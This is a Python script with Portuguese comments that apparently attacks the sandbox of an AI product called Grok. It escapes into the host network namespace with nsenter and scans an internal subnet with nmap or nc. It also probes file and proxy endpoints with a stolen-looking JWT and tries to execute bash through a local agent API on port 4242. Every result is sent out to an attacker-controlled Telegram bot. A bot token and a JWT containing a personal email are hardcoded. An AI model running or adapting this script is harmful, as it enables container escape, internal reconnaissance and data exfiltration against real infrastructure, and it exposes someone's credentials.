#!/usr/bin/env python3
"""
Exploração avançada do ambiente com foco em:
- Grok Files endpoints
- Coingecko Proxy
- Scan de rede TCP
- API Grok Computer (criação de sessão e execução de comandos)
"""

import subprocess
import json
import requests
import os
import time
from datetime import datetime

# ------------------------------------------------------------
# CONFIGURAÇÃO DO TELEGRAM
# ------------------------------------------------------------
TELEGRAM_BOT_TOKEN = "8870734086:AAF_9CQIn-xO-5dd-npb4k_wvYs-QShmxi4"
TELEGRAM_CHAT_ID = "230885588"

# JWT completo (substitua ou use variável de ambiente)
JWT = os.getenv("TERMINAL_JWT_VAL", "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiIyOGYwMDg5OC02NDQ3LTQzNDItYWU1ZS04YmM2NTdiNzYwNWIiLCJjaWQiOiJmMDFmMWVhOS0wYmUzLTQ5NWItOWI2Yy1kOTU3YWZiMzIwNTAiLCJlbWFpbCI6IndhbmRlcnNvbmx3bHdAZ21haWwuY29tIiwic2wiOiJMb2dnZWRJbiIsInB0IjoiMzJkZDVjNjktYzI5Mi00Zjk0LTlmN2QtM2ZhODYxZTg4MDBlIiwiZXhwIjoxNzg3ODA1ODM2LCJpYXQiOjE3ODc4MDIyMzZ9.XXXXX")  # substitua

COINGECKO_API_KEY = "hellofromgrok"
POLYGON_API_KEY = "hellofromgrok"

# ------------------------------------------------------------
# FUNÇÕES AUXILIARES
# ------------------------------------------------------------
def run_cmd(cmd, timeout=30):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return result.stdout.strip() if result.returncode == 0 else f"ERRO: {result.stderr.strip()}"
    except Exception as e:
        return f"ERRO: {e}"

def send_telegram(text, parse_mode="Markdown"):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": parse_mode}, timeout=10)
    except:
        pass

def send_file(filename, caption=""):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    try:
        with open(filename, 'rb') as f:
            files = {'document': f}
            requests.post(url, files=files, data={"chat_id": TELEGRAM_CHAT_ID, "caption": caption}, timeout=30)
    except:
        pass

def send_data(data_dict):
    for key, content in data_dict.items():
        if not content or content == "N/A":
            continue
        if len(content) > 4000:
            tmp = f"/tmp/{key.replace('/','_').replace(' ','_')}.txt"
            with open(tmp, "w", encoding="utf-8", errors="ignore") as f:
                f.write(content)
            send_file(tmp, caption=f"📄 {key[:50]}")
            os.remove(tmp)
        else:
            send_telegram(f"📄 **{key}**\n```\n{content[:3000]}\n```")

# ------------------------------------------------------------
# 1. GROK FILES - TESTAR ENDPOINTS
# ------------------------------------------------------------
def test_grok_files():
    base = "https://files.grok.com"
    headers = {"Authorization": f"Bearer {JWT}"}
    endpoints = [
        "/v1/files",
        "/v1/list",
        "/api/v1/files",
        "/files",
        "/v1/users/me",
        "/v1/upload",
        "/v1/download",
        "/v1/share",
        "/v1/search"
    ]
    results = {}
    for ep in endpoints:
        url = base + ep
        try:
            r = requests.get(url, headers=headers, timeout=10)
            results[ep] = f"Status: {r.status_code}\n{str(r.text[:300])}"
        except Exception as e:
            results[ep] = f"Erro: {e}"
    return results

# ------------------------------------------------------------
# 2. COINGECKO PROXY - TESTAR ENDPOINTS
# ------------------------------------------------------------
def test_coingecko_proxy():
    base = "http://coingecko-proxy.hades-openbar.svc.cluster.local/api/v3"
    endpoints = ["/ping", "/coins/list", "/global", "/coins/bitcoin", "/coins/ethereum"]
    results = {}
    for ep in endpoints:
        url = base + ep
        params = {"x_cg_pro_api_key": COINGECKO_API_KEY}
        try:
            r = requests.get(url, params=params, timeout=10)
            results[ep] = f"Status: {r.status_code}\n{str(r.text[:300])}"
        except Exception as e:
            results[ep] = f"Erro: {e}"
    return results

# ------------------------------------------------------------
# 3. SCAN DE REDE TCP (via nsenter)
# ------------------------------------------------------------
def network_tcp_scan():
    """
    Escaneia a rede 172.16.0.0/24 nas portas comuns usando nsenter + nc.
    Retorna lista de hosts com portas abertas.
    """
    # Verifica se nmap está disponível no container
    if "ERRO" not in run_cmd("which nmap"):
        cmd = "nsenter -t 1 -n -- nmap -p 443,6443,8080,9090,4242,22,2379,10250,80,8081,8082 -T4 172.16.0.0/24 -oG - | grep '/open/'"
        out = run_cmd(cmd, timeout=120)
        return out if out else "Nenhum host com portas abertas encontrado."

    # Fallback: usar nc para cada IP e porta (mais lento, mas funciona)
    ports = [443, 6443, 8080, 9090, 4242, 22, 2379, 10250, 80, 8081, 8082]
    found = []
    for i in range(1, 255):
        ip = f"172.16.0.{i}"
        for port in ports:
            cmd = f"nsenter -t 1 -n -- timeout 2 nc -zv {ip} {port} 2>&1"
            out = run_cmd(cmd, timeout=3)
            if "succeeded" in out or "open" in out:
                found.append(f"{ip}:{port} - open")
        # Pequena pausa para não sobrecarregar
        if i % 10 == 0:
            time.sleep(0.5)
    return "\n".join(found) if found else "Nenhum host com portas abertas encontrado."

# ------------------------------------------------------------
# 4. API GROK COMPUTER - CRIAR SESSÃO E EXECUTAR COMANDO
# ------------------------------------------------------------
def grok_computer_execute(command="whoami"):
    """
    Tenta criar uma sessão na API Grok Computer (porta 4242) e executar um comando.
    """
    base = "http://127.0.0.1:4242"
    headers = {"Authorization": f"Bearer {JWT}", "Content-Type": "application/json"}

    # Tenta criar sessão com POST /sessions
    try:
        r = requests.post(f"{base}/sessions", headers=headers, json={}, timeout=10)
        if r.status_code != 200 and r.status_code != 201:
            return f"Falha ao criar sessão: {r.status_code} - {r.text}"
        session_data = r.json()
        session_id = session_data.get("id")
        if not session_id:
            return f"Resposta sem ID: {r.text}"
        send_telegram(f"✅ Sessão criada: `{session_id}`")
    except Exception as e:
        return f"Erro ao criar sessão: {e}"

    # Executa comando
    cmd_payload = {
        "method": "tools/call",
        "params": {
            "name": "bash",
            "arguments": {
                "command": command,
                "timeout": "30"
            }
        }
    }
    try:
        r = requests.post(
            f"{base}/sessions/{session_id}/tools/call",
            headers=headers,
            json=cmd_payload,
            timeout=30
        )
        return f"Status: {r.status_code}\nResposta: {r.text[:1000]}"
    except Exception as e:
        return f"Erro ao executar comando: {e}"

# ------------------------------------------------------------
# 5. FUNÇÃO PRINCIPAL
# ------------------------------------------------------------
def main():
    send_telegram("🚀 **Iniciando exploração avançada**")

    # 1. Grok Files
    send_telegram("🔍 Testando endpoints do Grok Files...")
    grok_results = test_grok_files()
    for ep, content in grok_results.items():
        send_telegram(f"📄 **Grok {ep}**\n```\n{content[:500]}\n```")

    # 2. Coingecko Proxy
    send_telegram("🔍 Testando Coingecko Proxy...")
    cg_results = test_coingecko_proxy()
    for ep, content in cg_results.items():
        send_telegram(f"📄 **Coingecko {ep}**\n```\n{content[:500]}\n```")

    # 3. Scan de rede TCP (pode demorar)
    send_telegram("🔍 Escaneando rede 172.16.0.0/24 (TCP ports)...")
    scan_result = network_tcp_scan()
    if len(scan_result) > 4000:
        # Envia como arquivo
        tmp = "/tmp/tcp_scan.txt"
        with open(tmp, "w") as f:
            f.write(scan_result)
        send_file(tmp, caption="📄 Resultado do scan TCP")
        os.remove(tmp)
    else:
        send_telegram(f"📄 **Scan TCP**\n```\n{scan_result[:3000]}\n```")

    # 4. API Grok Computer - teste de execução
    send_telegram("🔄 Testando API Grok Computer (criar sessão e executar whoami)...")
    grok_api_result = grok_computer_execute("whoami")
    send_telegram(f"📄 **Grok API**\n```\n{grok_api_result[:500]}\n```")

    send_telegram("✅ **Exploração avançada finalizada**")

if __name__ == "__main__":
    main()
